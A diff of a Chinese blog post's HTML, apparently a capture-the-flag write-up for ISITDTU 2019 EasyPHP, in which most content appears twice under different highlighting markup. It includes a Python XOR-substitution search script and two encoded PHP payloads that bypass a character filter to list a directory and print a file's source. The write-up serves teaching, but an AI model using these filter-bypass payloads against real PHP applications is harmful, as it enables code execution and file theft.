subs3<br><br>def <span class="hljs-title function_ invoke__">main</span>():<br>    uniq = <span class="hljs-title function_ invoke__">sorted</span>(<span class="hljs-title function_ invoke__">set</span>(TARGET))<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;[*] target: &#123;TARGET&#125;&quot;</span>)<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;[*] unique chars (&#123;len(uniq)&#125;): &#123;&#x27;&#x27;.join(uniq)&#125;&quot;</span>)<br><br>    <span class="hljs-comment"># 基字符集合：默认用目标串已有字符；去掉禁用字面字符</span><br>    base_set = (<span class="hljs-title function_ invoke__">set</span>(uniq) - FORBIDDEN_BASE)<br>    <span class="hljs-keyword">if</span> ALLOW_EXTRA_BASE:<br>        base_set |= <span class="hljs-title function_ invoke__">set</span>(EXTRA_BASE)<br><br>    base = <span class="hljs-title function_ invoke__">sorted</span>(base_set)<br>    <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;[*] base (excluded &#123;FORBIDDEN_BASE&#125;): &#123;&#x27;&#x27;.join(base)&#125; (count=&#123;len(base)&#125;)&quot;</span>)<br><br>    <span class="hljs-comment"># 查找 2 元 / 3 元替代（材料都来自 base）</span><br>    subs2, subs3 = <span class="hljs-title function_ invoke__">find_subs</span>(base, uniq)<br><br>    <span class="hljs-comment"># 打印每个目标字符的部分替代方案（避免过长，这里各列举最多 6 条）</span><br>    LIM = <span class="hljs-number">6</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n== 2-term XOR (t = x ^ y), up to 6 examples ==&quot;</span>)<br>    <span class="hljs-keyword">for</span> t in uniq:<br>        <span class="hljs-keyword">if</span> t in subs2:<br>            ex = <span class="hljs-string">&quot; , &quot;</span>.<span class="hljs-title function_ invoke__">join</span>(f<span class="hljs-string">&quot;&#123;a&#125;^&#123;b&#125;&quot;</span> <span class="hljs-keyword">for</span> a, b in subs2[t][:LIM])<br>            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;  &#123;repr(t)&#125;: &#123;ex&#125;&quot;</span>)<br><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n== 3-term XOR (t = x ^ y ^ z), up to 6 examples ==&quot;</span>)<br>    <span class="hljs-keyword">for</span> t in uniq:<br>        <span class="hljs-keyword">if</span> t in subs3:<br>            ex = <span class="hljs-string">&quot; , &quot;</span>.<span class="hljs-title function_ invoke__">join</span>(f<span class="hljs-string">&quot;&#123;a&#125;^&#123;b&#125;^&#123;c&#125;&quot;</span> <span class="hljs-keyword">for</span> a, b, c in subs3[t][:LIM])<br>            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;  &#123;repr(t)&#125;: &#123;ex&#125;&quot;</span>)<br><br>    <span class="hljs-comment"># 可移除性：把某个字符从“可用材料”里剔除后，能否由剩余 base 合成它？</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n== Removability check (can t be rebuilt from BASE without using t and forbidden?) ==&quot;</span>)<br>    <span class="hljs-keyword">for</span> t in uniq:<br>        <span class="hljs-comment"># 这个检查的语义：我们想“删掉 t 这个字面字符”，看看还能不能用剩余 base 合成 t</span><br>        reduced_base = <span class="hljs-title function_ invoke__">sorted</span>((<span class="hljs-title function_ invoke__">set</span>(base) - &#123;t&#125;))<br>        s2, s3 = <span class="hljs-title function_ invoke__">find_subs</span>(reduced_base, [t])<br>        ok = (t in s2) <span class="hljs-keyword">or</span> (t in s3)<br>        <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;  remove &#123;repr(t)&#125; ?  &#123;&#x27;YES (rebuildable)&#x27; if ok else &#x27;NO&#x27;&#125;&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-title function_ invoke__">main</span>()<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xor_subs_no_forbidden.py</span></span><br><span class="line"><span class="keyword">from</span> itertools import product</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不允许作为“材料字符”（x/y/z）参与异或的字面字符：</span></span><br><span class="line"><span class="comment"># 注意：这是“字面字符集”的限制，与运算符 ^ 无关。</span></span><br><span class="line">FORBIDDEN_BASE = <span class="title function_ invoke__">set</span>(<span class="string">&quot;^;().&#x27;_&quot;</span>)     <span class="comment"># &lt;- 你要求的：不要把 ^ 和 ; 用作材料</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否允许引入额外的“材料字符”（不在目标串中）</span></span><br><span class="line">ALLOW_EXTRA_BASE = False</span><br><span class="line">EXTRA_BASE = <span class="string">&quot;&quot;</span>  <span class="comment"># 例如: &quot;_()&#123;&#125;&quot;；只有在 ALLOW_EXTRA_BASE=True 时才生效</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">o</span>(c): <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(c)</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">find_subs</span>(base_chars, target_chars):</span><br><span class="line">    base_codes = [<span class="title function_ invoke__">o</span>(c) <span class="keyword">for</span> c in base_chars]</span><br><span class="line">    <span class="comment"># 预建 2 元、3 元查表：值-&gt;(x,y, [z])</span></span><br><span class="line">    table2 = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> x, y in <span class="title function_ invoke__">product</span>(base_codes, repeat=<span class="number">2</span>):</span><br><span class="line">        table2.<span class="title function_ invoke__">setdefault</span>(x ^ y, []).<span class="title function_ invoke__">append</span>((x, y))</span><br><span class="line">    table3 = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> x, y, z in <span class="title function_ invoke__">product</span>(base_codes, repeat=<span class="number">3</span>):</span><br><span class="line">        table3.<span class="title function_ invoke__">setdefault</span>(x ^ y ^ z, []).<span class="title function_ invoke__">append</span>((x, y, z))</span><br><span class="line"></span><br><span class="line">    subs2, subs3 = &#123;&#125;, &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> t in target_chars:</span><br><span class="line">        ot = <span class="title function_ invoke__">o</span>(t)</span><br><span class="line">        <span class="keyword">if</span> ot in table2:</span><br><span class="line">            subs2[t] = [(<span class="title function_ invoke__">chr</span>(x), <span class="title function_ invoke__">chr</span>(y)) <span class="keyword">for</span> x, y in table2[ot]]</span><br><span class="line">        <span class="keyword">if</span> ot in table3:</span><br><span class="line">            subs3[t] = [(<span class="title function_ invoke__">chr</span>(x), <span class="title function_ invoke__">chr</span>(y), <span class="title function_ invoke__">chr</span>(z)) <span class="keyword">for</span> x, y, z in table3[ot]]</span><br><span class="line">    <span class="keyword">return</span> subs2, subs3</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">main</span>():</span><br><span class="line">    uniq = <span class="title function_ invoke__">sorted</span>(<span class="title function_ invoke__">set</span>(TARGET))</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[*] target: &#123;TARGET&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[*] unique chars (&#123;len(uniq)&#125;): &#123;&#x27;&#x27;.join(uniq)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 基字符集合：默认用目标串已有字符；去掉禁用字面字符</span></span><br><span class="line">    base_set = (<span class="title function_ invoke__">set</span>(uniq) - FORBIDDEN_BASE)</span><br><span class="line">    <span class="keyword">if</span> ALLOW_EXTRA_BASE:</span><br><span class="line">        base_set |= <span class="title function_ invoke__">set</span>(EXTRA_BASE)</span><br><span class="line"></span><br><span class="line">    base = <span class="title function_ invoke__">sorted</span>(base_set)</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[*] base (excluded &#123;FORBIDDEN_BASE&#125;): &#123;&#x27;&#x27;.join(base)&#125; (count=&#123;len(base)&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找 2 元 / 3 元替代（材料都来自 base）</span></span><br><span class="line">    subs2, subs3 = <span class="title function_ invoke__">find_subs</span>(base, uniq)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印每个目标字符的部分替代方案（避免过长，这里各列举最多 6 条）</span></span><br><span class="line">    LIM = <span class="number">6</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;\n== 2-term XOR (t = x ^ y), up to 6 examples ==&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> t in uniq:</span><br><span class="line">        <span class="keyword">if</span> t in subs2:</span><br><span class="line">            ex = <span class="string">&quot; , &quot;</span>.<span class="title function_ invoke__">join</span>(f<span class="string">&quot;&#123;a&#125;^&#123;b&#125;&quot;</span> <span class="keyword">for</span> a, b in subs2[t][:LIM])</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;  &#123;repr(t)&#125;: &#123;ex&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;\n== 3-term XOR (t = x ^ y ^ z), up to 6 examples ==&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> t in uniq:</span><br><span class="line">        <span class="keyword">if</span> t in subs3:</span><br><span class="line">            ex = <span class="string">&quot; , &quot;</span>.<span class="title function_ invoke__">join</span>(f<span class="string">&quot;&#123;a&#125;^&#123;b&#125;^&#123;c&#125;&quot;</span> <span class="keyword">for</span> a, b, c in subs3[t][:LIM])</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;  &#123;repr(t)&#125;: &#123;ex&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可移除性：把某个字符从“可用材料”里剔除后，能否由剩余 base 合成它？</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;\n== Removability check (can t be rebuilt from BASE without using t and forbidden?) ==&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> t in uniq:</span><br><span class="line">        <span class="comment"># 这个检查的语义：我们想“删掉 t 这个字面字符”，看看还能不能用剩余 base 合成 t</span></span><br><span class="line">        reduced_base = <span class="title function_ invoke__">sorted</span>((<span class="title function_ invoke__">set</span>(base) - &#123;t&#125;))</span><br><span class="line">        s2, s3 = <span class="title function_ invoke__">find_subs</span>(reduced_base, [t])</span><br><span class="line">        ok = (t in s2) <span class="keyword">or</span> (t in s3)</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;  remove &#123;repr(t)&#125; ?  &#123;&#x27;YES (rebuildable)&#x27; if ok else &#x27;NO&#x27;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="title function_ invoke__">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>我们使用</p>
-<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">a = c<span class="hljs-symbol">^p</span><span class="hljs-symbol">^r</span><br><span class="hljs-keyword">d</span> = <span class="hljs-keyword">s</span><span class="hljs-symbol">^c</span><span class="hljs-symbol">^t</span><br>n = i<span class="hljs-symbol">^s</span><span class="hljs-symbol">^t</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = c^p^r</span><br><span class="line">d = s^c^t</span><br><span class="line">n = i^s^t</span><br></pre></td></tr></table></figure>
 
 <p>替换成<code>print_r(sca(a = c^p^r).(n = i^s^t).(d = s^c^t).ir(&#39;.&#39;));</code>再进行取反，最后得出了payload。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(.));=((%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c)^(%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>f%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>f)^(%<span class="hljs-number">8</span>f%<span class="hljs-number">9</span>e%<span class="hljs-number">96</span>%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>c%a0%<span class="hljs-number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c)^(%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>c%a0%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>f)^(%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">96</span>%a0%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(.));=((%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">8</span>f%<span class="number">9</span>b%<span class="number">9</span>c%<span class="number">9</span>c%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>f%<span class="number">9</span>e%<span class="number">96</span>%<span class="number">96</span>%<span class="number">8</span>c%a0%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(((%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c)^(%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>b%<span class="number">9</span>c%a0%<span class="number">9</span>b%<span class="number">8</span>f)^(%<span class="number">8</span>c%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">96</span>%a0%<span class="number">96</span>%<span class="number">9</span>e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>
 
 <p>将其传入得到当前目录的文件：</p>
 <blockquote>
@@ -331,354 +257,158 @@
 </blockquote>
 <p>这个文件名太长了，直接cat我们替换字符不好找，可以用一些函数直接读数组最后一位。</p>
 <p>使用end()可以返回数组的最后一项：</p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110184305356-1762771388354-1.png" srcset="/img/loading.gif" lazyload alt="image-20251110184305356"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251110184305356-1762771388354-1.png" alt="image-20251110184305356"></p>
 <p>构造<code>readfile(end(scandir(.)))</code>即可。</p>
 <p>可以被替代的字符：</p>
-<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">r</span> = <span class="hljs-keyword">s</span><span class="hljs-symbol">^d</span><span class="hljs-symbol">^e</span><br><br>f = c<span class="hljs-symbol">^l</span><span class="hljs-symbol">^i</span><br><br>n = c<span class="hljs-symbol">^l</span><span class="hljs-symbol">^a</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = s^d^e</span><br><span class="line"></span><br><span class="line">f = c^l^i</span><br><span class="line"></span><br><span class="line">n = c^l^a</span><br></pre></td></tr></table></figure>
 
 <p>同样的方法构造payload:</p>
-<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">show_source(<span class="hljs-keyword">end</span>(scandir(.)));=((<span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%97</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%88</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%a0</span>)^(<span class="hljs-meta">%9a</span><span class="hljs-meta">%97</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%88</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9a</span>)^(<span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%88</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%a0</span>)^(<span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span>))(((<span class="hljs-meta">%a0</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8d</span>)^(<span class="hljs-meta">%9a</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9b</span>)^(<span class="hljs-meta">%a0</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%8d</span>)^(<span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span>))(((<span class="hljs-meta">%8d</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%88</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span>)^(<span class="hljs-meta">%9a</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8d</span>)^(<span class="hljs-meta">%9b</span><span class="hljs-meta">%a0</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%97</span><span class="hljs-meta">%9c</span>)^(<span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span><span class="hljs-meta">%ff</span>))(<span class="hljs-meta">%d1</span>^<span class="hljs-meta">%ff</span>)));<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>
 
 <h3 id="references"><a href="#references" class="headerlink" title="references:"></a>references:</h3><p>[<a target="_blank" rel="noopener" href="https://www.shawroot.cc/1209.html">ISITDTU 2019]EasyPHP – 「配枪朱丽叶。」</a></p>
 <p><a target="_blank" rel="noopener" href="https://kinseyy.github.io/2024/07/25/ISITDTU-2019-EasyPHP/">https://kinseyy.github.io/2024/07/25/ISITDTU-2019-EasyPHP/</a></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">everythingis-ok</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/')">[ISITDTU 2019]EasyPHP</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=[ISITDTU 2019]EasyPHP&amp;url=http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">haomeng's blog^^</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/07/NSSRound-7/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NSSRound#7</div></div></a></div><div class="next-post pull-right"><a href="/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记录一种文件上传的绕过方法</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">1.</span> <span class="toc-text">[ISITDTU 2019]EasyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#references"><span 